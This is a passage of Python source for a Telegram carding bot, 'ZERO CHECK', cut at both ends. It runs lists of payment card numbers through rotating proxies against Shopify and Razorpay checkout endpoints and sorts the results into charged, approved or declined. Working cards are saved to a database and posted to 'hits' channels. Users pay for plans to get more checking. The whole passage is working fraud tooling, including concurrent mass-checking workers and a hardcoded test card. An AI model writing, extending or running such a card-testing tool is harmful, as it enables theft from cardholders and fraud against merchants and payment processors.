<b>{bs('Bank')}:</b> <code>{bi.get('bank','-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_rz_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0):
    sm = {"Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
          "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
          "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
          "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])}
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank','-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

# ─── Force Join ────────────────────────────────────────────────────────────
_JOIN_CACHE = {}
async def is_user_joined(uid):
    if uid in ADMIN_ID: return True
    now = time.time()
    if _JOIN_CACHE.get(uid) and now - _JOIN_CACHE[uid] < 600: return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=uid))
            if isinstance(r.participant, ChannelParticipantBanned): return False
        except UserNotParticipantError: return False
        except (ChatAdminRequiredError, ChannelPrivateError): pass
        except: pass
    _JOIN_CACHE[uid] = now; return True
async def force_join_check(event):
    if event.sender_id in ADMIN_ID: return True
    if await is_user_joined(event.sender_id): return True
    _JOIN_CACHE.pop(event.sender_id, None); await remove_joined_mark(event.sender_id)
    buttons = [[pbtn(bs("Join Channel"), url=JOIN_CHANNEL_LINK)],[pbtn(bs("Join Group"), url=JOIN_GROUP_LINK)],[pbtn(bs("I have joined"), data="check_joined")]]
    text = f"""{PE} <b>{bs('Access Locked')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Join Both Chats to Unlock')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Channel')}:</b> <i>{bs('ZERO CHECK')}</i>
{PE} <b>{bs('Group')}:</b> <i>{bs('ZERO CHECK Chat')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('All Features Restricted')}</b>"""
    await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"],CE["fire"],CE["stop"],CE["link"],CE["info"],CE["warn"]])
    return False

# ─── Maintenance ──────────────────────────────────────────────────────────
MAINTENANCE_FILE = "maintenance.json"; _MAINTENANCE_CACHE = {"enabled":None,"last_check":0}
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE,"w") as f: await f.write(json.dumps({"maintenance":enabled}))
        _MAINTENANCE_CACHE = {"enabled":enabled,"last_check":time.time()}
    except: pass
async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30: return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE): return False
        async with aiofiles.open(MAINTENANCE_FILE,"r") as f: data = json.loads(await f.read())
        _MAINTENANCE_CACHE = {"enabled":data.get("maintenance",False),"last_check":now}
        return _MAINTENANCE_CACHE["enabled"]
    except: return False
async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""{PE} <b>{bs('Maintenance')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Bot under maintenance')}</b>
{PE} <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"],CE["stop"],CE["warn"],CE["info"]])
        return True
    return False

# ─── Access helpers ────────────────────────────────────────────────────────
async def can_use(uid, chat):
    await ensure_user(uid)
    if await is_banned_user(uid): return False, "banned"
    return True, f"{await get_user_plan(uid)}_private" if chat.id == uid else f"{await get_user_plan(uid)}_group"
async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id): return False, "banned", "Bronze"
    plan = await get_user_plan(event.sender_id)
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan
async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Premium Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('This feature requires an active plan')}</b>
{PE} <i>{bs('Use /plan to see available plans')}</i>""", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/SUPERGREMLIN01")]], emoji_ids=[CE["stop"],CE["stop"],CE["warn"],CE["info"]])
def banned_user_message():
    return f"""{PE} <b>{bs('Banned')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Not allowed')}</b>
{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"],CE["stop"],CE["warn"],CE["info"]]

async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: return True
    if not is_paid_plan(plan):
        if not is_group:
            await send_group_only_message(event); return False
        used = get_free_sp_usage(uid)
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>{bs('Daily Limit')}</b> {used}/{FREE_SP_DAILY_LIMIT}", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/SUPERGREMLIN01")]], emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/SUPERGREMLIN01")]])
            return False
    return True

# ─── Hit Sender ────────────────────────────────────────────────────────────
HIT_BUTTON = [[Button.url(bs("ZERO CHECK"), "https://t.me/+7hJ8-jOuoWJkZTQ9")]]
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    try:
        prem = await is_premium_user(uid); tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status","Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', gate_type); resp = res.get('Response','')
        if gate_type == "RazorPay":
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        else:
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Price')} ➛ {res.get('Price','-')}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        await styled_send(HITS_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except: pass

async def send_hit_to_channels(card, result, status, user_id, user_mention, gateway_type="Shopify", site=None, proxy_used=None):
    try:
        is_hit = status.upper() in ["CHARGED","APPROVED","3DS","ORDER_PLACED"]
        if not is_hit: return
        if HITS_CHANNEL_ID != 0:
            if status.upper() in ["CHARGED","ORDER_PLACED"]: status_text = f"⭐ {bs('HIT')} ➛ {bs('CHARGED')}"; pin = True
            elif status.upper() == "APPROVED": status_text = f"⭐ {bs('HIT')} ➛ {bs('APPROVED')}"; pin = False
            elif status.upper() == "3DS": status_text = f"⭐ {bs('HIT')} ➛ {bs('3DS')}"; pin = False
            else: status_text = f"⭐ {bs('HIT')} ➛ {bs(status)}"; pin = False
            mention = user_mention or "User"
            log_msg = pe(f"""{status_text}
{SEP}
⊀ {bs('Gateway')} ━ <code>{result.get('Gateway', gateway_type)}</code>
{bs('Response')} ━ <code>{result.get('Response','')[:45]}</code>
{bs('Price')} ━ <code>{result.get('Price','-')}</code>
{SEP}
{bs('User')} ➛ {mention}
{bs('Date')} ➛ {datetime.now().strftime('%d-%m-%Y')}
{SEP}
{DEV_LINE}""")
            vids = get_hit_video_paths(); sent = None
            if vids:
                try:
                    vp = random.choice(vids)
                    sent = await client.send_file(abs(HITS_CHANNEL_ID), file=vp, caption=log_msg, parse_mode='html', supports_streaming=True)
                except: pass
            if sent is None: sent = await styled_send(abs(HITS_CHANNEL_ID), log_msg)
            if pin and sent:
                try: await client.pin_message(abs(HITS_CHANNEL_ID), sent.id)
                except: pass
        if CHARGED_ONLY_CHANNEL_ID != 0:
            bi = await get_bin_info(card.split('|')[0] if '|' in card else card)
            bin_disp = f"{bi.get('brand','-')} - {bi.get('type','-')} - {bi.get('level','-')}"
            bank_disp = bi.get('bank','-'); country_disp = f"{bi.get('country','-')} {bi.get('flag','🏳️')}"
            mention = user_mention or f"<a href='tg://user?id={user_id}'>{user_id}</a>"
            uid_disp = f"<code>{user_id}</code>" if user_id else "N/A"
            site_disp = site or "N/A"
            proxy_line = f"\n{bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
            if status.upper() in ["CHARGED","ORDER_PLACED"]: status_label = f"{PE} {bs('CHARGED')}"
            elif status.upper() == "APPROVED": status_label = f"{PE} {bs('APPROVED')}"
            elif status.upper() == "3DS": status_label = f"{PE} {bs('3DS')}"
            else: status_label = f"{PE} {bs(status)}"
            full_msg = pe(f"""{status_label}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{result.get('Gateway', gateway_type)}</code>
{bs('Site')} ━ <code>{site_disp}</code>
{bs('Response')} ━ <code>{result.get('Response','')}</code>
{bs('Price')} ━ <code>{result.get('Price','-')}</code>{proxy_line}
{SEP}
{bs('BIN')} ━ <code>{bin_disp}</code>
{bs('Bank')} ━ <code>{bank_disp}</code>
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {mention} ({uid_disp})
{bs('Date')} ➛ {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}
{SEP}
{DEV_LINE}""")
            vids = get_hit_video_paths(); sent = None
            if vids:
                try:
                    vp = random.choice(vids)
                    sent = await client.send_file(abs(CHARGED_ONLY_CHANNEL_ID), file=vp, caption=full_msg, parse_mode='html', supports_streaming=True)
                except: pass
            if sent is None: sent = await styled_send(abs(CHARGED_ONLY_CHANNEL_ID), full_msg)
            if status.upper() in ["CHARGED","ORDER_PLACED"] and sent:
                try: await client.pin_message(abs(CHARGED_ONLY_CHANNEL_ID), sent.id)
                except: pass
    except Exception as e: log_user(user_id, "HIT_CHANNEL_ERROR", str(e), "error")

# ─── Status system ────────────────────────────────────────────────────────
BOT_START_TIME = time.time()
def _get_system_uptime():
    if not PSUTIL_AVAILABLE: return "N/A"
    s = int(time.time() - psutil.boot_time()); d,r = divmod(s,86400); h,r = divmod(r,3600); m,sec = divmod(r,60)
    return f"{d}d {h:02}:{m:02}:{sec:02}"
def _get_bot_uptime():
    s = int(time.time() - BOT_START_TIME); d,r = divmod(s,86400); h,r = divmod(r,3600); m,sec = divmod(r,60)
    return f"{d}d {h:02}:{m:02}:{sec:02}"
def _create_progress_bar(p, l=10):
    f = int(l * p / 100); return f"{'█'*f}{'░'*(l-f)} {p:.1f}%"
def _get_system_info():
    if not PSUTIL_AVAILABLE: return {"error":"psutil not installed","current_time":datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    try:
        cpu = psutil.cpu_percent(interval=0); cnt = psutil.cpu_count(logical=True); freq = psutil.cpu_freq()
        mem = psutil.virtual_memory(); disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
        return {"cpu_usage":cpu,"cpu_count":cnt,"cpu_freq":freq.current if freq else 0,
                "total_memory":mem.total/(1024**3),"used_memory":mem.used/(1024**3),"available_memory":mem.available/(1024**3),"memory_percent":mem.percent,
                "total_disk":disk.total/(1024**3),"used_disk":disk.used/(1024**3),"free_disk":disk.free/(1024**3),"disk_percent":disk.percent,
                "hostname":socket.gethostname(),"os_name":platform.system(),"os_version":platform.version(),"architecture":platform.machine(),
                "bytes_sent":net.bytes_sent/(1024**2),"bytes_recv":net.bytes_recv/(1024**2),
                "uptime_str":_get_system_uptime(),"bot_uptime_str":_get_bot_uptime(),
                "current_time":datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "bot_restart_time":datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S"),
                "cpu_critical":cpu>90,"memory_critical":mem.percent>90,"disk_critical":disk.percent>90,"error":None}
    except Exception as e: return {"error":str(e),"current_time":datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
async def _build_status_text():
    info = await asyncio.get_event_loop().run_in_executor(None, _get_system_info)
    if info.get("error"): return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {info['error']}</code>\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/SUPERGREMLIN01'>@SUPERGREMLIN01</a>"
    s = info
    msg = (f"⌬ <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> ↬ <code>✅ Active</code>\n――――――――――――――\n"
           f"⌬ <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['bot_uptime_str']}</code>\n"
           f"⌬ <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['uptime_str']}</code>\n"
           f"⌬ <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> ↬ <code>{s['bot_restart_time']}</code>\n――――――――――――――\n"
           f"⌬ <b>𝐂𝐏𝐔</b> ↬ <code>{s['cpu_usage']:.1f}% ({s['cpu_count']} cores)</code>\n"
           f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['cpu_usage'])}</code>\n――――――――――――――\n"
           f"⌬ <b>𝐑𝐀𝐌</b> ↬ <code>{s['used_memory']:.2f}GB / {s['total_memory']:.2f}GB</code>\n"
           f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['memory_percent'])}</code>\n――――――――――――――\n"
           f"⌬ <b>𝐃𝐢𝐬𝐤</b> ↬ <code>{s['used_disk']:.2f}GB / {s['total_disk']:.2f}GB</code>\n"
           f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['disk_percent'])}</code>\n――――――――――――――\n"
           f"⌬ <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> ↬ <code>↑ {s['bytes_sent']:.1f}MB ↓ {s['bytes_recv']:.1f}MB</code>\n")
    if s["cpu_critical"] or s["memory_critical"] or s["disk_critical"]: msg += "\n⚠️ <b>Warning:</b> System resources critically low!"
    msg += f"\n――――――――――――――\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/SUPERGREMLIN01'>@SUPERGREMLIN01</a>"
    return msg

# ─── Shopify / Razorpay APIs ──────────────────────────────────────────────
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'): site = f'https://{site}'
    url = f'{SHOPIFY_API_URL}?site={quote(site,safe="")}&cc={quote(cc,safe="")}'
    if proxy_data:
        ip,port = proxy_data['ip'],proxy_data['port']; un,pw = proxy_data.get('username'),proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps,safe="")}'
    return url

def classify_response(rj):
    ar = str(rj.get('Response','')); st = rj.get('Status',False); price = rj.get('Price','-'); gw = rj.get('Gate',rj.get('Gateway','Shopify'))
    if price not in (None,'-'): price = f"${price}"
    rl = ar.lower()
    if is_site_error(ar) or is_proxy_error(ar): return {"Response":ar,"Price":price,"Gateway":gw,"Status":"SiteError"}
    ch = ['order_paid','order_placed','order_confirmed','thank you','payment successful','order_completed','charged','order_created','order confirmed']
    ap = ['otp_required','otp required','3d_authentication','3ds_required','3d required','3d_redirect','authentication_required','insufficient_funds','insufficient funds','cvc','ccn','ccn live cvv']
    dc = ['generic_decline','generic decline','do_not_honor','do not honor','stolen_card','lost_card','pickup_card','pick_up_card','restricted_card','restricted card','fraudulent','fraud suspected','fraud_suspected','expired_card','expired card','transaction_not_allowed','transaction not allowed','card_declined','card declined','processor_declined','processor declined','card_not_supported','card not supported','currency_not_supported','duplicate_transaction','revocation_of_authorization','no_action_taken','try_again_later','not_permitted','decline','your card was declined','payment_intent_authentication_failure','avs_check_failed','incorrect number','incorrect_number','invalid','invalid_number','decision_rule_block','generic_error']
    if any(k in rl for k in ch): return {"Response":ar,"Price":price,"Gateway":gw,"Status":"Charged"}
    if any(k in rl for k in ap): return {"Response":ar,"Price":price,"Gateway":gw,"Status":"Approved"}
    if any(k in rl for k in dc): return {"Response":ar,"Price":price,"Gateway":gw,"Status":"Declined"}
    if st is True and not any(w in rl for w in ["decline","denied","failed","error","rejected","refused","fraud"]): return {"Response":ar,"Price":price,"Gateway":gw,"Status":"Approved"}
    return {"Response":ar,"Price":price,"Gateway":gw,"Status":"Declined"}

async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "sp"))
        async with s.get(url) as r:
            if r.status != 200: return {"Response":f"HTTP_{r.status}","Price":"-","Gateway":"-","Status":"SiteError","card":card,"site":site}
            try: rj = await r.json(content_type=None)
            except: return {"Response":"Invalid JSON","Price":"-","Gateway":"-","Status":"SiteError","card":card,"site":site}
        res = classify_response(rj); res["card"]=card; res["site"]=site; return res
    except asyncio.TimeoutError: return {"Response":"Timeout","Price":"-","Gateway":"-","Status":"SiteError","card":card,"site":site}
    except asyncio.CancelledError: raise
    except Exception as e:
        err = str(e); st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response":err[:100],"Price":"-","Gateway":"Unknown","Status":st2,"card":card,"site":site}

async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites: return {"Response":"No sites","Price":"-","Gateway":"-","Status":"Error","card":card}, -1
    tried_sites = set(); tried_proxies = set(); last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check(): return {"Response":"Stopped","Price":"-","Gateway":"-","Status":"Error","card":card}, -1
        site = rotator.pick_site(sites, exclude=tried_sites) if rotator else random.choice([s for s in sites if s not in tried_sites] or list(sites))
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies) if rotator else random.choice([p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data))
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        res = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        if res.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return res, sites.index(site)+1
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(res.get("Response","")): rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = res
        if attempt < max_retries-1: await asyncio.sleep(0.3)
    if last: last["Status"]="Error"; return last, -1
    return {"Response":"Max retries","Price":"-","Gateway":"-","Status":"Error","card":card}, -1

async def test_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url) as resp:
            if resp.status != 200: return {'site':site,'status':'dead','price':'-','response':f'HTTP_{resp.status}'}
            try: raw = await resp.json(content_type=None)
            except: return {'site':site,'status':'dead','price':'-','response':'Invalid JSON'}
        rm = raw.get('Response',''); price = raw.get('Price','-')
        if price and price != '-': price = f"${price}"
        if is_site_error(rm.lower()): return {'site':site,'status':'dead','price':price,'response':rm}
        return {'site':site,'status':'alive','price':price,'response':rm}
    except Exception as e: return {'site':site,'status':'dead','price':'-','response':str(e)[:50]}

def build_rz_api_url(cc, proxy_data=None):
    url = f'{RAZORPAY_API_URL}?cc={quote(cc,safe="")}'
    if proxy_data:
        un = proxy_data.get('username') or ''; pw = proxy_data.get('password') or ''
        ip = proxy_data['ip']; port = proxy_data['port']
        ps = f"{un}:{pw}@{ip}:{port}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps,safe="")}'
    return url

def clean_rz_response(raw):
    if not raw: return raw
    cleaned = re.sub(r'^(?:DEAD|LIVE|SUCCESS|CHARGED|APPROVED|DECLINED)\s*\|\s*ID:\s*pay_[a-zA-Z0-9]+\s*\|\s*', '', raw, flags=re.I).strip()
    return cleaned if cleaned else raw

def classify_rz_response(rj):
    gate = 'RazorPay'
    raw = str(rj.get('response', rj.get('Response', ''))); resp = clean_rz_response(raw); rl = resp.lower()
    if is_rz_retry_error(resp): return {"Response":resp,"Price":"-","Gateway":gate,"Status":"RetryError"}
    charged = ['transaction success','payment successful','payment success','order_paid','charged']
    approved = ['insufficient account balance','insufficient_funds','insufficient funds','otp_required','otp required','3d_authentication','3ds_required','authentication_required','cvc','ccn']
    declined = ['payment cancelled','cancelled','card_declined','card declined','generic_decline','generic decline','do_not_honor','do not honor','stolen_card','lost_card','expired_card','expired card','restricted_card','fraudulent','not_permitted','transaction_not_allowed','card_not_supported','decline','your card was declined','payment failed','failed','generic_error']
    if any(k in rl for k in charged): return {"Response":resp,"Price":"-","Gateway":gate,"Status":"Charged"}
    if any(k in rl for k in approved): return {"Response":resp,"Price":"-","Gateway":gate,"Status":"Approved"}
    if any(k in rl for k in declined): return {"Response":resp,"Price":"-","Gateway":gate,"Status":"Declined"}
    return {"Response":resp,"Price":"-","Gateway":gate,"Status":"Declined"}

async def check_rz_api(card, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_rz_api_url(card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "rz"))
        async with s.get(url) as r:
            if r.status != 200: return {"Response":f"HTTP_{r.status}","Price":"-","Gateway":"RazorPay","Status":"RetryError","card":card}
            try: rj = await r.json(content_type=None)
            except: return {"Response":"Invalid JSON","Price":"-","Gateway":"RazorPay","Status":"RetryError","card":card}
        res = classify_rz_response(rj); res["card"]=card; return res
    except asyncio.TimeoutError: return {"Response":"Timeout","Price":"-","Gateway":"RazorPay","Status":"RetryError","card":card}
    except asyncio.CancelledError: raise
    except Exception as e: return {"Response":str(e)[:100],"Price":"-","Gateway":"RazorPay","Status":"RetryError","card":card}

async def check_rz_with_retry(card, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None):
    tried_proxies = set(); last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check(): return {"Response":"Stopped","Price":"-","Gateway":"RazorPay","Status":"Error","card":card}
        proxy_data = None
        if proxies_data:
            proxy_data = random.choice([p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data))
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        res = await check_rz_api(card, proxy_data, user_id, http_session=http_session)
        if res.get("Status") != "RetryError": return res
        last = res
        if attempt < max_retries-1: await asyncio.sleep(0.5)
    if last: last["Status"]="Error"; return last
    return {"Response":"Max retries","Price":"-","Gateway":"RazorPay","Status":"Error","card":card}

# ─── Mass processor ────────────────────────────────────────────────────────
ACTIVE_MTXT_PROCESSES = {}; ACTIVE_MRZ_PROCESSES = {}; ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}; PENDING_SITE_CHECK = {}; USER_APPROVED_PREF = {}

async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    uid = event.sender_id
    try:
        sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or "User"
    except: username, name = f"user_{uid}", "User"
    total = len(cards); checked = charged = approved = declined = errors = 0
    is_rz = gate_name == "RazorPay"; mode = bs("C+A") if send_approved else bs("C only")
    st = time.time(); hits = []
    workers = MRZ_PER_USER_WORKERS if sem_type == "mrz" else MSP_PER_USER_WORKERS
    user_sem = get_user_sem(uid, sem_type); http_session = await get_user_http_session(uid, sem_type)
    sm = await styled_reply(event, f"<pre>{PE} {bs('Processing')} ━ {mode} ━ {gate_name} ━ {workers}{bs('w')}</pre>", emoji_ids=[CE["chart"]])
    last_ui = [0]; lcd, lrd = "-", "-"
    def is_stopped():
        proc = process_store.get(uid)
        return proc.get("stopped", False) if isinstance(proc, dict) else True
    async def update_ui():
        nonlocal last_ui
        now = time.time()
        if now - last_ui[0] < 3.0 or is_stopped(): return
        last_ui[0] = now
        kb = [[pbtn(f" {lcd}", "none")],[pbtn(f" {lrd}", "none")],
              [pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
              [pbtn(f"{bs('D')} ━ {declined}", "none"), pbtn(f"{bs('E')} ━ {errors}", "none")],
              [pbtn(f" {checked}/{total}", "none")],[pbtn(bs("Stop"), f"{stop_prefix}:{uid}")]]
        try: await styled_edit(sm, f"<pre>{PE} {bs('Processing')}...</pre>", buttons=kb, emoji_ids=[CE["star"]])
        except: pass
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if is_stopped(): return
        async with user_sem:
            if is_stopped(): return
            try:
                res = await check_func(card, http_session)
                if is_stopped(): return
                status = res.get("Status","Declined"); resp = res.get("Response",""); gw = res.get("Gateway", gate_name)
                checked += 1; lcd = card; lrd = resp[:30]
                if status == "Error": errors += 1
                elif status == "Charged":
                    charged += 1; hits.append(f"{card} - CHARGED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, res.get('Price','-')))
                    asyncio.create_task(increment_charge_count(uid))
                    asyncio.create_task(_send_mass_hit(card, res, status, uid, username, name, is_rz))
                    asyncio.create_task(send_channel_hit(res, uid, username, name, "RazorPay" if is_rz else "Shopify"))
                elif status == "Approved":
                    approved += 1; hits.append(f"{card} - APPROVED - {resp} - {gw}")
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, res.get('Price','-')))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, res, status, uid, username, name, is_rz))
                        asyncio.create_task(send_channel_hit(res, uid, username, name, "RazorPay" if is_rz else "Shopify"))
                else: declined += 1
                await update_ui()
            except asyncio.CancelledError: return
            except:
                if not is_stopped(): errors += 1; checked += 1
    batch_size = workers * 2; all_tasks = []; proc = process_store.get(uid)
    for i in range(0, len(cards), batch_size):
        if is_stopped(): break
        batch = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
        all_tasks.extend(batch)
        if isinstance(proc, dict): proc["tasks"] = all_tasks
        await asyncio.gather(*batch, return_exceptions=True)
    await asyncio.sleep(0.3)
    el = int(time.time()-st); h,m,s = el//3600,(el%3600)//60,el%60
    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
    ft = f"""{PE} <b>{bs('Complete')}{stop_label}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Charged')}</b> ━ <code>{charged}</code>
{PE} <b>{bs('Approved')}</b> ━ <code>{approved}</code>
{PE} <b>{bs('Declined')}</b> ━ <code>{declined}</code>
{PE} <b>{bs('Errors')}</b> ━ <code>{errors}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    fkb = [[pbtn(f"{bs('C')} ━ {charged}", "none"), pbtn(f"{bs('A')} ━ {approved}", "none")],
           [pbtn(f"{bs('T')} ━ {checked}/{total}", "none"), pbtn(f"{h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none")]]
    for _ in range(3):
        try: await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"],CE["crown"],CE["gem"],CE["check"],CE["declined"],CE["warn"],CE["star"]]); break
        except: await asyncio.sleep(0.5)
    await send_final_file(uid, charged, approved, declined, errors, total, hits, uid)
    process_store.pop(uid, None); await cleanup_user_http_session(uid, sem_type); cleanup_user_sem(uid)

async def _send_mass_hit(card, res, status, uid, username, name, is_rz=False):
    await asyncio.sleep(1.5)
    try:
        bi = await get_bin_info(card.split("|")[0]); gw = res.get('Gateway', 'RazorPay' if is_rz else 'Shopify'); resp = res.get('Response','')[:150]
        if is_rz: msg, eid = format_rz_single_result(status, card, gw, resp, bi, 0.0)
        else: msg, eid = format_simple_card_result(status, card, gw, resp, bi, 0.0, extra_field=("Price", res.get('Price','-')) if res.get('Price','-') != '-' else None)
        try: await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except: pass
    except: pass

async def send_final_file(uid, charged, approved, declined, errors, total, hits=None, target_chat=None):
    hits = hits or []; fn = f"zero_check_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"; target = target_chat or uid
    try:
        async with aiofiles.open(fn,'w',encoding='utf-8') as f:
